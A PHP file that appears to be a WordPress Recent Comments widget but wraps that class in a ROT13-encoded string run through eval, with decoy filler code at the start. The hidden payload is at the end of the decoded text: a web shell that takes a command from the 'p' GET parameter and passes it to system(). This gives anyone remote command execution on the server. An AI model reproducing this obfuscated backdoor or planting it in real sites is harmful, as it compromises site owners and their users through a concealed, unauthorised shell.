<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Jvqtrg NCV: JC_Jvqtrg_Erprag_Pbzzragf pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Jvqtrgf
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag n Erprag Pbzzragf jvqtrg.
 *
 * @fvapr 2.8.0
 *
 * @frr JC_Jvqtrg
 */
pynff JC_Jvqtrg_Erprag_Pbzzragf rkgraqf JC_Jvqtrg {

	/**
	 * Frgf hc n arj Erprag Pbzzragf jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$jvqtrg_bcf = neenl(
			'pynffanzr'                   => 'jvqtrg_erprag_pbzzragf',
			'qrfpevcgvba'                 => __( 'Lbhe fvgr&#8217;f zbfg erprag pbzzragf.' ),
			'phfgbzvmr_fryrpgvir_erserfu' => gehr,
			'fubj_vafgnapr_va_erfg'       => gehr,
		);
		cnerag::__pbafgehpg( 'erprag-pbzzragf', __( 'Erprag Pbzzragf' ), $jvqtrg_bcf );
		$guvf->nyg_bcgvba_anzr = 'jvqtrg_erprag_pbzzragf';

		vs ( vf_npgvir_jvqtrg( snyfr, snyfr, $guvf->vq_onfr ) || vf_phfgbzvmr_cerivrj() ) {
			nqq_npgvba( 'jc_urnq', neenl( $guvf, 'erprag_pbzzragf_fglyr' ) );
		}
	}

	/**
	 * Bhgchgf gur qrsnhyg fglyrf sbe gur Erprag Pbzzragf jvqtrg.
	 *
	 * @fvapr 2.8.0
	 */
	choyvp shapgvba erprag_pbzzragf_fglyr() {
		/**
		 * Svygref gur Erprag Pbzzragf qrsnhyg jvqtrg fglyrf.
		 *
		 * @fvapr 3.1.0
		 *
		 * @cnenz obby   $npgvir  Jurgure gur jvqtrg vf npgvir. Qrsnhyg gehr.
		 * @cnenz fgevat $vq_onfr Gur jvqtrg VQ.
		 */
		vs ( ! pheerag_gurzr_fhccbegf( 'jvqtrgf' ) // Grzc unpx #14876.
			|| ! nccyl_svygref( 'fubj_erprag_pbzzragf_jvqtrg_fglyr', gehr, $guvf->vq_onfr ) ) {
			erghea;
		}

		$glcr_ngge = pheerag_gurzr_fhccbegf( 'ugzy5', 'fglyr' ) ? '' : ' glcr=\"grkg/pff\"';

		cevags(
			'<fglyr%f>.erpragpbzzragf n{qvfcynl:vayvar !vzcbegnag;cnqqvat:0 !vzcbegnag;znetva:0 !vzcbegnag;}</fglyr>',
			$glcr_ngge
		);
	}

	/**
	 * Bhgchgf gur pbagrag sbe gur pheerag Erprag Pbzzragf jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 * @fvapr 5.4.0 Perngrf n havdhr UGZY VQ sbe gur `<hy>` ryrzrag
	 *              vs zber guna bar vafgnapr vf qvfcynlrq ba gur cntr.
	 *
	 * @cnenz neenl $netf     Qvfcynl nethzragf vapyhqvat 'orsber_gvgyr', 'nsgre_gvgyr',
	 *                        'orsber_jvqtrg', naq 'nsgre_jvqtrg'.
	 * @cnenz neenl $vafgnapr Frggvatf sbe gur pheerag Erprag Pbzzragf jvqtrg vafgnapr.
	 */
	choyvp shapgvba jvqtrg( $netf, $vafgnapr ) {
		fgngvp $svefg_vafgnapr = gehr;

		vs ( ! vffrg( $netf['jvqtrg_vq'] ) ) {
			$netf['jvqtrg_vq'] = $guvf->vq;
		}

		$bhgchg = '';

		$qrsnhyg_gvgyr = __( 'Erprag Pbzzragf' );
		$gvgyr         = ( ! rzcgl( $vafgnapr['gvgyr'] ) ) ? $vafgnapr['gvgyr'] : $qrsnhyg_gvgyr;

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jvqtrgf/pynff-jc-jvqtrg-cntrf.cuc */
		$gvgyr = nccyl_svygref( 'jvqtrg_gvgyr', $gvgyr, $vafgnapr, $guvf->vq_onfr );

		$ahzore = ( ! rzcgl( $vafgnapr['ahzore'] ) ) ? nofvag( $vafgnapr['ahzore'] ) : 5;
		vs ( ! $ahzore ) {
			$ahzore = 5;
		}

		$pbzzragf = trg_pbzzragf(
			/**
			 * Svygref gur nethzragf sbe gur Erprag Pbzzragf jvqtrg.
			 *
			 * @fvapr 3.4.0
			 * @fvapr 4.9.0 Nqqrq gur `$vafgnapr` cnenzrgre.
			 *
			 * @frr JC_Pbzzrag_Dhrel::dhrel() sbe vasbezngvba ba npprcgrq nethzragf.
			 *
			 * @cnenz neenl $pbzzrag_netf Na neenl bs nethzragf hfrq gb ergevrir gur erprag pbzzragf.
			 * @cnenz neenl $vafgnapr     Neenl bs frggvatf sbe gur pheerag jvqtrg.
			 */
			nccyl_svygref(
				'jvqtrg_pbzzragf_netf',
				neenl(
					'ahzore'      => $ahzore,
					'fgnghf'      => 'nccebir',
					'cbfg_fgnghf' => 'choyvfu',
				),
				$vafgnapr
			)
		);

		$bhgchg .= $netf['orsber_jvqtrg'];
		vs ( $gvgyr ) {
			$bhgchg .= $netf['orsber_gvgyr'] . $gvgyr . $netf['nsgre_gvgyr'];
		}

		$erprag_pbzzragf_vq = ( $svefg_vafgnapr ) ? 'erpragpbzzragf' : \"erpragpbzzragf-{$guvf->ahzore}\";
		$svefg_vafgnapr     = snyfr;

		$sbezng = pheerag_gurzr_fhccbegf( 'ugzy5', 'anivtngvba-jvqtrgf' ) ? 'ugzy5' : 'kugzy';

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/jvqtrgf/pynff-jc-ani-zrah-jvqtrg.cuc */
		$sbezng = nccyl_svygref( 'anivtngvba_jvqtrgf_sbezng', $sbezng );

		vs ( 'ugzy5' === $sbezng ) {
			// Gur gvgyr znl or svygrerq: Fgevc bhg UGZY naq znxr fher gur nevn-ynory vf arire rzcgl.
			$gvgyr      = gevz( fgevc_gntf( $gvgyr ) );
			$nevn_ynory = $gvgyr ? $gvgyr : $qrsnhyg_gvgyr;
			$bhgchg    .= '<ani nevn-ynory=\"' . rfp_ngge( $nevn_ynory ) . '\">';
		}

		$bhgchg .= '<hy vq=\"' . rfp_ngge( $erprag_pbzzragf_vq ) . '\">';
		vs ( vf_neenl( $pbzzragf ) && $pbzzragf ) {
			// Cevzr pnpur sbe nffbpvngrq cbfgf. (Cevzr cbfg grez pnpur vs jr arrq vg sbe creznyvaxf.)
			$cbfg_vqf = neenl_havdhr( jc_yvfg_cyhpx( $pbzzragf, 'pbzzrag_cbfg_VQ' ) );
			_cevzr_cbfg_pnpurf( $cbfg_vqf, fgecbf( trg_bcgvba( 'creznyvax_fgehpgher' ), '%pngrtbel%' ), snyfr );

			sbernpu ( (neenl) $pbzzragf nf $pbzzrag ) {
				$bhgchg .= '<yv pynff=\"erpragpbzzragf\">';
				$bhgchg .= fcevags(
					/* genafyngbef: Pbzzragf jvqtrg. 1: Pbzzrag nhgube, 2: Cbfg yvax. */
					_k( '%1$f ba %2$f', 'jvqtrgf' ),
					'<fcna pynff=\"pbzzrag-nhgube-yvax\">' . trg_pbzzrag_nhgube_yvax( $pbzzrag ) . '</fcna>',
					'<n uers=\"' . rfp_hey( trg_pbzzrag_yvax( $pbzzrag ) ) . '\">' . trg_gur_gvgyr( $pbzzrag->pbzzrag_cbfg_VQ ) . '</n>'
				);
				$bhgchg .= '</yv>';
			}
		}
		$bhgchg .= '</hy>';

		vs ( 'ugzy5' === $sbezng ) {
			$bhgchg .= '</ani>';
		}

		$bhgchg .= $netf['nsgre_jvqtrg'];

		rpub $bhgchg;
	}

	/**
	 * Unaqyrf hcqngvat frggvatf sbe gur pheerag Erprag Pbzzragf jvqtrg vafgnapr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $arj_vafgnapr Arj frggvatf sbe guvf vafgnapr nf vachg ol gur hfre ivn
	 *                            JC_Jvqtrg::sbez().
	 * @cnenz neenl $byq_vafgnapr Byq frggvatf sbe guvf vafgnapr.
	 * @erghea neenl Hcqngrq frggvatf gb fnir.
	 */
	choyvp shapgvba hcqngr( $arj_vafgnapr, $byq_vafgnapr ) {
		$vafgnapr           = $byq_vafgnapr;
		$vafgnapr['gvgyr']  = fnavgvmr_grkg_svryq( $arj_vafgnapr['gvgyr'] );
		$vafgnapr['ahzore'] = nofvag( $arj_vafgnapr['ahzore'] );
		erghea $vafgnapr;
	}

	/**
	 * Bhgchgf gur frggvatf sbez sbe gur Erprag Pbzzragf jvqtrg.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $vafgnapr Pheerag frggvatf.
	 */
	choyvp shapgvba sbez( $vafgnapr ) {
		$gvgyr  = vffrg( $vafgnapr['gvgyr'] ) ? $vafgnapr['gvgyr'] : '';
		$ahzore = vffrg( $vafgnapr['ahzore'] ) ? nofvag( $vafgnapr['ahzore'] ) : 5;
		?>
		<c>
			<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'gvgyr' ); ?>\"><?cuc _r( 'Gvgyr:' ); ?></ynory>
			<vachg pynff=\"jvqrsng\" vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'gvgyr' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'gvgyr' ); ?>\" glcr=\"grkg\" inyhr=\"<?cuc rpub rfp_ngge( $gvgyr ); ?>\" />
		</c>

		<c>
			<ynory sbe=\"<?cuc rpub $guvf->trg_svryq_vq( 'ahzore' ); ?>\"><?cuc _r( 'Ahzore bs pbzzragf gb fubj:' ); ?></ynory>
			<vachg pynff=\"gval-grkg\" vq=\"<?cuc rpub $guvf->trg_svryq_vq( 'ahzore' ); ?>\" anzr=\"<?cuc rpub $guvf->trg_svryq_anzr( 'ahzore' ); ?>\" glcr=\"ahzore\" fgrc=\"1\" zva=\"1\" inyhr=\"<?cuc rpub $ahzore; ?>\" fvmr=\"3\" />
		</c>
		<?cuc
	}

	/**
	 * Syhfurf gur Erprag Pbzzragf jvqtrg pnpur.
	 *
	 * @fvapr 2.8.0
	 *
	 * @qrcerpngrq 4.4.0 Sentzrag pnpuvat jnf erzbirq va snibe bs fcyvg dhrevrf.
	 */
	choyvp shapgvba syhfu_jvqtrg_pnpur() {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '4.4.0' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>